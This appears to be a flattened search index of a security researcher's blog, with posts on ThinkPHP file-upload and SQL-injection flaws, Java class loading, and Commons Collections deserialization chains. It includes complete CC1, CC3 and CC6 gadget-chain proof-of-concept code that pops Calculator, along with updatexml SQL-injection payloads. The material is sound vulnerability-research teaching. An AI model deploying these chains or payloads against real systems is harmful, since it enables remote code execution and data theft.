if(input('post.')){ $data = input('post.'); foreach ($data as $k =\u003e $v) { $arr = explode('_',$k); $_data['id'] = $arr[1]; $_data['value'] = $v; $file = request()-\u003efile('pic_'.$_data['id']); if($file){ $info = $file-\u003emove(ROOT_PATH . 'public' . DS . 'uploads'); if($info){ $_data['value'] = '/public' . DS . 'uploads/'.$info-\u003egetSaveName(); } } if($_data['value'] == '' \u0026\u0026 isset($arr[2]) \u0026\u0026 $arr[2] == 3){ continue; } Db::name('config')-\u003eupdate($_data); } cache('conf',null); $this-\u003esuccess('编辑成功'); } } 可以看到直接input接受参数，并且利用了request()-\u003efile来上传文件 而在thinkphp中的file函数，是没有安全设置的 所以可以直接进行上传， 构造poc 在public目录下面，成功进行了上传 但是文件名字看起来是一串随机的字符串组成的，这怎么办呢？我们根进去查看一下是怎么生成的，跟进move函数 看到了buildSavename函数正是文件保存命名规则， 跟进去查看一下，命名规则是date日期 前面的date函数是 uploads 下面的目录，而后面的md5(microtime(true))正是生成的那一串看似随机的字符串，爆破一下即可出文件名 那针对microtime(true)这样的该如何爆破呢？ 在ctfshow 元旦水友赛中出过这样一道题 https://docs.qq.com/doc/DRlBMcWdhZW9ZUnFB 里面有爆破脚本 在System控制器下，同样存在类似的功能点 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:3","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["Java"],"content":" CommonsCollections3详解通过类动态加载可以得知defineClass可以执行任意代码 全局搜索一下哪里调用了defineClass, TemplatesImpl类里调用了，再全局搜索一下哪里调用了这里的defineClass类 在defineTransletClasses方法这里进行了调用 再搜索一下哪里调用了defineTransletClasses 在getTransletInstance()方法调用了defineTransletClasses()方法并且，还执行了newInstance()进行了初始化操作，可以将注入的类执行 编写这部分的poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); templatesImpl.newTransformer(); } } Test.java import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { { try { Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 通过上面的例子，我们只需要调用到newTransformer()方法即可，回想 CC1链是有任意类任意方法调用的，所以直接把 CC1 复制过来 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templatesImpl), new InvokerTransformer(\"newTransformer\",null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); //serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-16","objectID":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections3链详解","uri":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 另一条上面的例子可以得知是InvokerTransformer类的transformer调用了TemplateImpl类的newTransformer()方法才得以执行的，这里再找一个其他类调用newTransformer()方法 在TrxAXFilter类的构造器中调用了newTransformer()方法，但是TrxAXFilter类无法被序列化，所以找一个可以被序列化的类来调用TrxAXFilter类的构造器，这里选择了InstantiateTransformer类中的transformer()方法，来调用上面的构造器从而调用到newTransformer()方法 构造poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); //serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-16","objectID":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/:2:0","tags":["CommonsCollections"],"title":"CommonsCollections3链详解","uri":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 类加载与反序列化类加载的时候会执行代码 初始化：静态代码快 实例化：构造代码快、无参构造函数 ","date":"2024-01-16","objectID":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/:1:0","tags":["CommonsCollections"],"title":"Java 动态类加载","uri":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"},{"categories":["Java"],"content":" 动态类加载方法Class.forname 初始化/不初始化 ClassLoader.loadClass不进行初始化 底层的原理，实现加载任意的类 URLClassLoader任意类加载：file/http/jar URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://localhost:9080/\")}); Class\u003c?\u003e c = urlClassLoader.loadClass(\"Test\"); c.newInstance(); ClassLoader.defineClass字节码加载任意类 私有 ClassLoader cl = ClassLoader.getSystemClassLoader(); Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); Class c= (Class) defineClassMethod.invoke(cl,\"Test\",code,0,code.length); c.newInstance(); Unsafe.defineClass字节码加载 public类不能直接生成 Spring 里面可以直接生成 ClassLoader cl = ClassLoader.getSystemClassLoader(); Class c = Unsafe.class; Field theUnsafeField = c.getDeclaredField(\"theUnsafe\"); theUnsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafeField.get(null); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); Class c2 = unsafe.defineClass(\"Test\",code,0,code.length,cl,null); c2.newInstance(); ","date":"2024-01-16","objectID":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/:2:0","tags":["CommonsCollections"],"title":"Java 动态类加载","uri":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"},{"categories":["PHP"],"content":" ThinkPHP 5基础以ThinkPHP5.1.x版本为例 composer create-project topthink/think=5.1.36 thinkphp5.1.36 ThinkPHP5.1完全开发手册 先来了解目录架构，这里直接看手册 https://www.kancloud.cn/manual/thinkphp5_1/353950 ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 访问模式5.1的 URL 访问受路由决定，如果在没有定义或匹配路由的情况下(并且没有开启强制路由)，则基于 /index.php（或者其它入口文件）/模块/控制器/操作/参数/值… ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:1","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 请求参数继承了控制器基类think\\Controller直接使用this-\u003erequest-\u003eparam('name');来获取请求参数 Facade调用Request::param('name'); 助手函数request()-\u003eparam('name'); ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:2","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞详解parseWhereItem未过滤处理where查询表达式 漏洞 Demo public function sqlDemo(){ $username = request()-\u003eget('username'); $result1 = db('user')-\u003ewhere('username','exp',$username)-\u003eselect(); } Poc ) union select 1,2,updatexml(1,concat(1,user(),1),1)--+ debug断点调试，跟进where()方法 这里跟进parseWhereExp()方法， 利用whereExp来处理传入的$username，继续跟进whereExp()方法 进行了赋值之后，直接返回， 便进入到select()方法里面，和ThinkPHP3 SQL 注入有类似之处，这里直接进入parseWhere()方法里面进行了返回 然后进行了一系列操作之后，就直接执行了。 ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"世界上最好用的 CC 链 ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections6 详解CommonsCollections1 的链子调用了LazyMap类中的transform()方法，于是找一个任意类调用get()方法的地方，这里换到了TideMapEntry类 这里的hashCode()方法里调用了getValue()方法里面调用了get()方法，并且map可控，这里的hashCode()很熟悉，因为在URLDNS链中HashMap类里的readObject()方法调用到了hashCode()方法 于是构造poc package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, \"test\"); HashMap\u003cObject, Object\u003e map2 = new HashMap\u003c\u003e(); map2.put(tiedMapEntry,\"test1\"); lazymap.remove(\"test\"); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap,chainedTransformer); //serialize(map2); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"N1Rvana's introduction","date":"2024-01-15","objectID":"/about/","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" About MeSU Team of member ","date":"2024-01-15","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" My CVEs CVE-ID Porject CVE-2022-2886 Laravel CVE-2022-2870 Laravel CVE-2022-33107 ThinkPHP ","date":"2024-01-15","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"N1Rvana's friends","date":"2024-01-15","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":" Base info - nickname: N1rvana avatar: https://nlrvana.github.io/avatar.png url: https://nlrvana.github.io/ 交换友链，请按上述格式发送至beichenghua@gmail.com ","date":"2024-01-15","objectID":"/friends/:1:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":["PHP"],"content":"ThinkPHP 漏洞学习 环境搭建ThinkPHP3 composer create-project topthink/thinkphp=版本号 文件名 ThinkPHP5(完整版) composer create-project topthink/think=版本号 文件名 阿里云 Compose 全量镜像资源库 composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ https://www.runoob.com/w3cnote/composer-install-and-usage.html https://packagist.org/ 框架了解审计之前，我们需要了解框架的信息 ThinkPHP3.2.3完全开发手册 composer create-project topthink/thinkphp=3.2.3 thinkphp3.2.3 index.php 入口文件 Application 应用目录 Public 资源文件目录 ThinkPHP 框架目录 其中框架目录ThinkPHP的结构如下 Common 核心公共函数目录 Conf 核心配置目录 Lang 核心语言包目录 Library 核心类库目录 Think 核心Think类库目录 Behavior 行为类库目录 Org Org类库目录 Vendor 第三方类库目录 ... 更多类库目录 Mode 框架应用模式目录 Tpl 系统模板目录 ThinkPHP.php 框架入口文件 其中Application目录如下 Common 应用公共模块 Common 应用公共函数目录 Conf 应用公共配置文件目录 Home 默认生成的Home模块 Conf 模块配置文件目录 Common 模块函数公共目录 Controller 模块控制器目录 Model 模块模型目录 View 模块视图文件目录 Runtime 运行时目录 Cache 模板缓存目录 Data 数据目录 Logs 日志目录 Temp 缓存目录 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 路由信息thinkphp3使用 URL 模式切换：普通 GET 模式、pathinfo、rewrite 和兼容模式 /ThinkPHP/Conf/convention.php return array( \"URL_MODEL\" =\u003e 1 //URL模式:0(普通模式) 1(PATHINFO 模式) 2(REWRITE模式) 3(兼容模式) //静态路由 \"URL_ROUTE_ON\" =\u003e fasle, \"URL_ROUTE_RULES\" =\u003e array() ) 历史漏洞","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" SQL 注入","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x01 聚合查询功能count方法未过滤调用parseKey 利用条件ThinkPHP[5.0.0,5.0.23]，ThinkPHP 3 全版本 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:1","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞分析和原理ThinkPHP3.2.3 漏洞 demo public function SqlDemo(){ $field = I('get.field'); $num = M('user')-\u003ecount($field); //M('user') 相当于 new Think\\Model('user') var_dump($num); } poc ?field=id),updatexml(1,concat(1,user(),1),1)from+user%23 在这里打个断点，跟进 会进入到ThinkPHP/Library/Think/Model.class.php中的__call方法中， 因为是count，所以进入到$this-\u003egetField()方法 经过对传入字段进行解析等一系列操作之后， 进入到$this-\u003edb-\u003eselect()方法中 此时传入的$options变成了 继续跟进，这里进入到了$this-\u003ebuildSelectSql()方法，来构建 select 语句 进入到$this-\u003eparseSql()方法中 利用$this-\u003eparseField()方法进行解析，继续跟进 这里的$this-\u003eparseKey()对传入的 payload 并没有进行过滤 然后便回到$this-\u003eparseField()方法中，返回构建的 field 语句 最终回到$this-\u003eparseSql()方法中，返回最终需要执行的 sql 语句 最后得到了执行 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:2","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x02 _parseOptions未过滤$options导致 sql 注入 利用条件ThinkPHP \u003c= 3.2.3 漏洞原理和分析$options查询条件可以不经过数据处理直接进入_parseOptions，再进入Driver.class.php的sql操作函数，和上面一样通过buildSelectsql方法或直接调用delete方法进行拼接 sql 语句，然后再进行执行 漏洞 Demo public function SqlDemo() { $id = I('id'); $res = M('user')-\u003eselect($id); $res = M('user')-\u003efind($id); } poc id[comment]=\\*/where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)/\\* id[limit]=1,1+procdure+analyse(updatexml(1,concat(0x7e,user(),0x7e),1),1)-- id[field]=* from user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1) --+ 具体构造出多少个poc，可以看pasexxx有多少个 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:3","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"比较难一点的CC链 CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法 很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的 构造一个简单的 payload 试试 new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}).transform(Runtime.getRuntime()); 找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法 valueTransformer变量可控 但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用 再查看一下哪里调用了checkSetValue()方法，只有这一处 setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationhandleconstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationhandleconstructor.setAccessible(true); Object o = annotationInvocationhandleconstructor.newInstance(Target.class,transformedMap); 但是这里存在两个问题 第一个问题是Runtime没有实现Seriablable接口，无法参与序列化过程 利用反射来解决，这里再利用一个ChainedTransformer.transform方法 简单来说就是上一个执行transform方法返回的结果作为下一个执行transform方法输入 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 还有一个问题，无法控制setValue()里面的参数值 这里利用org.apache.commons.collections.functors.ConstantTransformer的transform()方法，无论传入什么，都会返回固定的值 所以完善一下上面的poc Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 于是完整的poc如下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollection1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); InvokerTransformer invokerTransformer =new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } 整个调用栈如下 注 这里为什么要用Target Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); 因为Target中有值是value 这里的getKey()获取的就是，上面map.put()放入的key值 map.put(\"value\",\"value\"); key放入value，正好能取出Target中的值，所以就绕过了if条件 ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 